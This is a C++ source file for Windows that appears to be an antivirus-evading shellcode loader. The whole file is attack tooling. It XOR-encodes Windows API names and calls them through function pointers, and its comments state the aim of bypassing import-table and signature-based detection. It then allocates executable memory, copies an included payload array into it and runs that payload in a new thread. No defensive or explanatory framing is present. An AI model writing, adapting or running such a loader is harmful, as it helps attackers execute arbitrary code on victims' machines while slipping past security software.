#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "payload.h"
#include <windows.h>
#include <fstream>
#include <ctime>
#include <csignal>
#include <bitset>
#include <sstream>



std::string xor_binary_string(const std::string& binary_string, const std::string& key) {
	std::string result;
	std::size_t key_size = key.size();
	for (std::size_t i = 0; i < binary_string.size(); i += 8) {
		std::bitset<8> byte(binary_string.substr(i, 8));
		byte ^= std::bitset<8>(key[i / 8 % key_size]);
		result += static_cast<char>(byte.to_ulong());
	}
	return result;
}



std::string key = "secure_101";
void play_payload() {
	
	// define function pointers for using windows apis without calling them directly , to bypass ImportAddressTable AV scan
	LPVOID(WINAPI * pV_alloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
	VOID(WINAPI * p_rtlmvm) (VOID UNALIGNED * Destination,VOID UNALIGNED * Source,SIZE_T Length);
	FARPROC(WINAPI * p_gtprocAd) (HMODULE hModule,LPCSTR  lpProcName);
	HANDLE(WINAPI* p_crt_thrd)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
    DWORD(WINAPI* p_wait_obj)(HANDLE hHandle,DWORD  dwMilliseconds);
	void (WINAPI* pSleep)(DWORD dwMilliseconds);
	// writing functions names encrypted , to bypass signature based detection
	std::string krnl = xor_binary_string("000110000000000000010001000110110001011100001001011011000000001100011110010101010001111100001001", key); //  kernel32.dll
	std::string gtprocAd = xor_binary_string("0011010000000000000101110010010100000000000010100011110001110000010101000101010100000001000000000001000000000110", key);// GetProcAddress
	std::string V_alloc = xor_binary_string("001001010000110000010001000000010000011100000100001100110111000001011100010111010001110000000110", key);	//VirtualAlloc
	std::string rtlmvm = xor_binary_string("00100001000100010000111100111000000111010001001100111010011111000101010101011100000111000001011100011010", key);	//RtlMoveMemory
	std::string crt_thrd= xor_binary_string("001100000001011100000110000101000000011000000000000010110101100101000010010101000001001000000001", key); 	// CreateThread
	std::string wait_obj = xor_binary_string("00100100000001000000101000000001001101000000101000101101011000100101100101011111000101000000100100000110001110100001000000001111001110100101001001000100", key);// WaitForSingleObject
	
	// define our custom functions pointers to map to the real WinApi functions 
	// Using getModuleHandle for dll file and getprocAddress for function address in the dll 
	p_gtprocAd = reinterpret_cast<FARPROC(__cdecl*)(HMODULE,LPCSTR)>(GetProcAddress(GetModuleHandle(krnl.c_str()), gtprocAd.c_str()));
	pV_alloc = reinterpret_cast<LPVOID(__cdecl*)(LPVOID,SIZE_T,DWORD,DWORD)>(p_gtprocAd(GetModuleHandle(krnl.c_str()), V_alloc.c_str()));
	p_rtlmvm = reinterpret_cast<VOID(__cdecl*)(VOID UNALIGNED * Destination,VOID UNALIGNED * Source,SIZE_T Length)>(p_gtprocAd(GetModuleHandle(krnl.c_str()), rtlmvm.c_str()));
	p_crt_thrd = reinterpret_cast<HANDLE(__cdecl*)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)>(p_gtprocAd(GetModuleHandle(krnl.c_str()), crt_thrd.c_str()));
	p_wait_obj = reinterpret_cast<DWORD(__cdecl*)(HANDLE hHandle, DWORD  dwMilliseconds)>(p_gtprocAd(GetModuleHandle(krnl.c_str()), wait_obj.c_str()));

	// Allocate  executable memory for the shellcode
	LPVOID execMem = pV_alloc(NULL, sizeof(playnow), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy the shellcode into memory
	p_rtlmvm(execMem, playnow, sizeof(playnow));

	//create thread to run the newly added shellcode
	HANDLE th;
	th = p_crt_thrd(0, 0, (LPTHREAD_START_ROUTINE)execMem, 0, 0, 0);
	p_wait_obj(th, -1);


}




int main() {

	play_payload();
	return 0;
}

